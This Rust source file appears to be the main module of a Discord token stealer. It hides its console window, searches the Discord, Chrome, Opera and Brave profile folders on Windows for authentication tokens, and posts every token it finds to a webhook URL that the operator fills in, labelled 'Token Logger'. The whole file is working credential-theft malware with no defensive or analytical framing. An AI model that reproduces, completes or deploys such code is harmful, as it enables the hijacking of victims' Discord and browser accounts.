#![windows_subsystem = "windows"]

mod read;
mod find;

use find::finder::find_tokens;

#[tokio::main]
async fn main() {
    use dirs::home_dir;
    let url = "Webhook Url Here"; // Replace with your actual webhook URL
    let home_dir = home_dir().unwrap();
    let home_str = home_dir.to_string_lossy();
    let mut paths: Vec<String> = Vec::new();
    let roaming = format!("{}\\AppData\\Roaming", &home_str);
    let local = format!("{}\\AppData\\Local", &home_str);
    paths.push(format!("{}\\Discord", &roaming));
    paths.push(format!("{}\\discordcanary", &roaming));
    paths.push(format!("{}\\discordptb", &roaming));
    paths.push(format!("{}\\Google\\Chrome\\User Data\\Default", &local));
    paths.push(format!("{}\\Opera Software\\Opera Stable", &roaming));
    paths.push(format!(
        "{}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        &local
    ));

    for path in paths {
        let tokens = find_tokens(&path);
        let _res = match tokens {
            Ok(v) => send_tokens(url, v).await,
            Err(..) => (),
        };
    }
}

async fn send_tokens(url: &str, tokens: Vec<String>) {
    use webhook::client::WebhookClient;
    let client: WebhookClient = WebhookClient::new(url);
    for token in tokens {
        client
            .send(|message| {
                message
                    .username("Token Logger")
                    .embed(|embed| embed.title("Token Log").description(&token))
            })
            .await
            .unwrap();
    }
}
